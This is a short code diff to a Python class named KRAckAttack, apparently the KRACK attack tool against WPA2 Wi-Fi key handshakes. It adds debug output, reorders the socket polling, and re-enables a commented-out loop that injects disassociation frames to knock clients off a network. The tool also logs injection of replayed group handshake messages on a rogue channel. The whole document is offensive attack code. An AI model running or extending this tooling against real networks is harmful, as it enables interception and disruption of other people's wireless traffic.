@@ -637,7 +637,9 @@ class KRAckAttack():
 
 	def handle_rx_realchan(self):
 		p = self.sock_real.recv()
-		if p == None: return
+		if p == None: 
+			print_rx(INFO, "debug: ", 'None')
+			return
 
 		print_rx(INFO, "debug: ", p)
 		# 1. Handle frames sent TO the real AP
@@ -926,7 +928,7 @@ class KRAckAttack():
 		self.last_rogue_beacon = time.time()
 		nextbeacon = time.time() + 0.01
 		while True:
-			sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
+			sel = select.select([self.sock_real, self.sock_rogue, self.hostapd.stdout], [], [], 0.1)
 			if self.sock_real      in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
 			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
@@ -937,8 +939,8 @@ class KRAckAttack():
 				self.time_forward_group1 = None
 				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
-			# while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
-			# 	self.send_disas(self.disas_queue.pop()[1])
+			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
+				self.send_disas(self.disas_queue.pop()[1])
 
 			if self.continuous_csa and nextbeacon <= time.time():
 				self.send_csa_beacon(silent=True)
